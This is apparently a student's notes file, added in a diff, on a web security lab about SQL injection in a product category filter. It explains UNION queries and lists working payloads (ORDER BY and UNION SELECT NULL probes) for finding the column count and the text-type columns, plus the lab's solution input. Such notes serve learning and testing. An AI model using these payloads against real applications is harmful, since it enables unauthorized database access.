@@ -1,0 +1,62 @@
+SQL Injection - Product Category Filter
+
+End Goal: finding a column containing text.
+
+About Union:
+
+table1     table2
+a | b      c | d
+-----      -----
+1 , 2      2 , 3
+3 , 4      4 , 5
+
+Query #1: SELECT a, b FROM table1
+1 , 2
+3 , 4
+
+Query #2: SELECT a, b FROM table1 UNION SELECT c, d FROM table2
+1 , 2
+3 , 4
+2 , 3
+4 , 5
+
+Rules:
+- The number and the order of the column must be same in all the queries.
+- The data types must be compatible.
+
+Step #1: Determine the # of columns:
+
+SQLi Attack (Method #1):
+
+SELECT ? FROM table1 UNION SELECT NULL
+-error -> incorrect number of columns
+
+-iteratively increase the NULL until we get correct number of columns.
+
+SELECT ? FROM table1 UNION SELECT NULL, NULL, NULL
+-200 response code -> correct number of columns
+
+SQLi Attack (Method #2):
+
+SELECT a, b FROM table1 ORDER BY 3
+
+Srep #2: Determine the data type of columns:
+
+SELECT a, b, c FROM table1 UNION SELECT 'a', NULL, NULL
+-error -> column is not type text
+-no error -> column is type text
+
+Analysis:
+
+' order by 3--
+-> 3 columns, the first column is not shown on the page.
+
+' UNION SELECT 'a', NULL, NULL--
+' UNION SELECT NULL, 'a', NULL--
+' UNION SELECT NULL, 'a', 'a'--
+
+->To solve the lab insert yhe given text in 2nd column.
+' UNION SELECT NULL, '4dnQ0P', NULL--
+
+-> 2nd column is of type string.
+
